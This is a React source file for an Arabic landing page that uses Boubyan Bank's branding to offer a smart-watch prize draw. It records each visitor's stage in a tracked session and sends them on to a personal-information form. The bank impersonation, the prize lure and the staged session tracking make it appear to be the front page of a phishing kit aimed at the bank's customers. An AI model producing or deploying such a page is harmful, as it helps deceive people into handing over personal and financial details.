import { useCallback, useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { WATCHES, type Watch } from "@/data/watches";
import { createOrUpdateRequest } from "@/api/visitorSession";
import { setSelectedWatch } from "@/lib/session";
import { useVisitorSession } from "@/hooks/useVisitorSession";
import { ROUTES } from "@/routes";

export default function HomePage() {
  const navigate = useNavigate();
  const [modalOpen, setModalOpen] = useState(false);
  const [selected, setSelected] = useState<Watch | null>(null);

  useVisitorSession("watches");

  const openModal = useCallback((watch: Watch) => {
    setSelected(watch);
    setSelectedWatch(watch.name);
    setModalOpen(true);
    document.body.classList.add("modal-open");
  }, []);

  const closeModal = useCallback(() => {
    setModalOpen(false);
    document.body.classList.remove("modal-open");
  }, []);

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape" && modalOpen) closeModal();
    };
    document.addEventListener("keydown", onKey);
    return () => document.removeEventListener("keydown", onKey);
  }, [modalOpen, closeModal]);

  useEffect(() => () => document.body.classList.remove("modal-open"), []);

  const onContinue = async () => {
    if (!selected) return;
    setSelectedWatch(selected.name);
    closeModal();
    await createOrUpdateRequest({
      stage_key: "watches",
      contact_ref: "visitor",
      notify_key: "----",
      stage_state: "pending",
      prize_choice: selected.name,
    });
    navigate(ROUTES.personalInfo);
  };

  return (
    <>
      <section id="view-home" className="view view--active" aria-label="الصفحة الرئيسية" dir="rtl">

        {/* Hero */}
        <div className="hp-hero">
          <div className="hp-hero__bg" />
          <div className="hp-hero__content">
            <img src="/BoubyanBankLogo_(1).webp" alt="بنك بوبيان" className="hp-hero__logo" />
            <div className="hp-hero__badge">🎁 عرض حصري لعملاء بوبيان</div>
            <h1 className="hp-hero__title">جوائز الساعات الذكية</h1>
            <p className="hp-hero__sub">
              اختر ساعتك المفضلة من مجموعتنا الحصرية وسجّل بياناتك للمشاركة في السحب
            </p>
            <div className="hp-hero__steps">
              <div className="hp-step"><span className="hp-step__num">١</span><span>اختر الساعة</span></div>
              <div className="hp-step__arrow">←</div>
              <div className="hp-step"><span className="hp-step__num">٢</span><span>سجّل بياناتك</span></div>
              <div className="hp-step__arrow">←</div>
              <div className="hp-step"><span className="hp-step__num">٣</span><span>استلم جائزتك</span></div>
            </div>
          </div>
        </div>

        {/* Watches Grid */}
        <div className="hp-section">
          <h2 className="hp-section__title">اختر ساعتك</h2>
          <p className="hp-section__sub">انقر على الساعة لعرض التفاصيل والمتابعة</p>
          <div className="hp-grid">
            {WATCHES.map((w) => (
              <button key={w.id} type="button" className="hp-card" onClick={() => openModal(w)}>
                <div className="hp-card__img-wrap">
                  <img className="hp-card__img" src={w.image} alt={w.name} width={260} height={260} loading="lazy" />
                  <div className="hp-card__overlay">
                    <span className="hp-card__cta">عرض التفاصيل ←</span>
                  </div>
                </div>
                <div className="hp-card__body">
                  <p className="hp-card__name">{w.name}</p>
                  <ul className="hp-card__feats">
                    {w.features.slice(0, 2).map((f) => (
                      <li key={f}>✓ {f}</li>
                    ))}
                  </ul>
                </div>
              </button>
            ))}
          </div>
        </div>

        {/* Footer */}
        <footer className="hp-footer">
          <img src="/BoubyanBankLogo_(1).webp" alt="بنك بوبيان" className="hp-footer__logo" />
          <p>© {new Date().getFullYear()} بنك بوبيان — جميع الحقوق محفوظة</p>
        </footer>
      </section>

      {/* Modal */}
      <div className={`hp-modal-wrap ${modalOpen ? "hp-modal-wrap--open" : ""}`} hidden={!modalOpen}>
        <div className="hp-modal-backdrop" onClick={closeModal} />
        <div className="hp-modal" role="dialog" aria-modal="true">
          <button type="button" className="hp-modal__close" onClick={closeModal} aria-label="إغلاق">✕</button>
          {selected && (
            <>
              <div className="hp-modal__img-wrap">
                <img src={selected.image} alt={selected.name} className="hp-modal__img" width={320} height={320} />
              </div>
              <div className="hp-modal__body" dir="rtl">
                <div className="hp-modal__badge">ساعة ذكية مميزة</div>
                <h2 className="hp-modal__title">{selected.name}</h2>
                <ul className="hp-modal__feats">
                  {selected.features.map((f) => (
                    <li key={f}>
                      <span className="hp-modal__feat-icon">✓</span>
                      {f}
                    </li>
                  ))}
                </ul>
                <button type="button" className="hp-modal__btn" onClick={onContinue}>
                  متابعة للتسجيل ←
                </button>
              </div>
            </>
          )}
        </div>
      </div>
    </>
  );
}
